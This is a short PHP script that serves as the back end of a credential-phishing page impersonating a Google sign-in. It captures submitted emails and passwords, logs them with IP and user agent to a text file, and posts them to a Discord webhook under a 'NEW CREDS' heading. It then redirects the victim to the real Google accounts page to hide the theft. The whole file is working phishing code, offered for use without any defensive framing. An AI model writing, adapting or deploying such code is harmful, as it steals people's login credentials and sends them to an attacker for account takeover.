<?php
if($_POST['email']&&$_POST['password']){
    $email=htmlspecialchars($_POST['email']);
    $password=htmlspecialchars($_POST['password']);
    $ip=$_SERVER['REMOTE_ADDR']??'local';
    $ua=substr($_SERVER['HTTP_USER_AGENT']??'unknown',0,50);
    $time=date('Y-m-d H:i:s');
    
    // Store in GitHub repo file
    $log="[$time] EMAIL: $email | PASS: $password | IP: $ip | UA: $ua\n";
    file_put_contents('passwords.txt',$log,FILE_APPEND|LOCK_EX);
    
    // Discord webhook (optional - get from Discord channel settings)
    $webhook='https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE';
    if($webhook!='https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE'){
        $data=json_encode(['content'=>"🎣 **NEW CREDS** ```$email:$password``` **IP:** $ip"]);
        $ch=curl_init($webhook);
        curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
        curl_setopt($ch,CURLOPT_HTTPHEADER,['Content-Type: application/json']);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_exec($ch);
        curl_close($ch);
    }
    
    header('Location: https://accounts.google.com/');
    exit;
}
header('Location: index.php');
?>